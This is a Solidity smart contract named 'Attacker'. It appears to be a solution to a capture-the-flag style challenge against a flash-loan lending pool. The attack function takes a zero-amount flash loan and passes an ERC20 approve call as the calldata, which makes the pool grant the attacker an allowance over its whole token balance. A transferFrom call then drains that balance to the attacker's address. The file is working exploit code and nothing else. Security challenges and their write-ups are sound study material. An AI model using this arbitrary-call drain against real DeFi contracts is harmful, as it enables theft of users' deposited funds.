// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title Attacker
 * @author Rixiao Zhang
 */

interface ITrustLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract Attacker {
    using Address for address;

    constructor() {}

    function attack(
        IERC20 token,
        ITrustLenderPool pool,
        address attackerEOA
    ) public {
        uint256 poolBalance = token.balanceOf(address(pool));
        // IERC20::approve(address spender, uint256 amount)
        bytes memory approvePayload = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );
        // target = address(token)
        pool.flashLoan(0, attackerEOA, address(token), approvePayload);

        token.transferFrom(address(pool), attackerEOA, poolBalance);
    }
}
